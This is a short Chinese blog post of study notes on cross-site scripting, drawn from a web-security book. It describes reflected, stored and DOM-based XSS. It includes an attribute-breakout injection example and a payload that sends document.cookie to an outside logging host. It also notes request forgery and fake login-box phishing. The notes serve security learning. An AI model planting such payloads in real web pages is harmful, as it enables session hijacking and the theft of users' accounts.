title: "xss小记(1)"
date: 2014-11-12 22:44:00
tags:
---

看《白帽子讲web安全》笔记整理

xss本身叫css的(cross site script)

但是为了区分style sheet简称xss

xss基本分为如下三种

1.反射型XSS

     需要用户触发点击

2.存储型XSS

     强稳定性，因存储在服务器上,当用户访问到脚本时候，即可构成攻击

3.DOM-xss

     严格意义上说也属于反射型XSS，通过修改页面DOM节点形成xss

     通过构建html

     example:

    ```

     &lt;a href=‘“+str+”&gt;innerhtml&lt;/a&gt;
     &lt;a href=“ 此处提前闭合标签
     ‘&gt;&lt;img onerror=“xss()”&gt;

     ```

XSS payload

1.  `img.src=“[http://blue.com/log](http://blue.com/log)?” + escape(document.cookie)`

     并不一定log？这个php文件一定存在，服务器log文件也会存有get请求日志

     cookie劫持，可以模拟用户登录，造成一定危害性

    2.伪造GET\POST请求

        *   可模拟GET请求，删除文章，邮件，等！*   document.createElement(“form”)；

        form.submit();
    *   XMLHttpRuquest发送post

XSS钓鱼

     伪造登录框

     获取cookie，即可伪造你的登录。。想想太可怕了

感想就是,js可以做的事情太多了。。这是另外一种看js的角度，赞

《web前端黑客技术解密》在读

未完待续